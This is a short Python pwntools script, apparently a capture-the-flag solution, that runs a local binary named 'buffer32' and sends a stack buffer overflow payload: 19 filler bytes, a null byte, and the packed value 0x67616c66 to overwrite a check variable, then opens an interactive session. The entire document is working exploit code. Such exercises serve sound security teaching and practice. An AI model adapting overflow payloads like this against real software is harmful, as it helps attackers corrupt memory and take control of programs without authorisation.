from pwn import *

r = process("./buffer32")
offset = 19
#offset2 = 8
target = p32(0x67616c66)
payload = ""
payload += "A"*offset + "\x00"
#payload += "A"*offset2
payload += target

r.sendline(payload)
r.interactive()

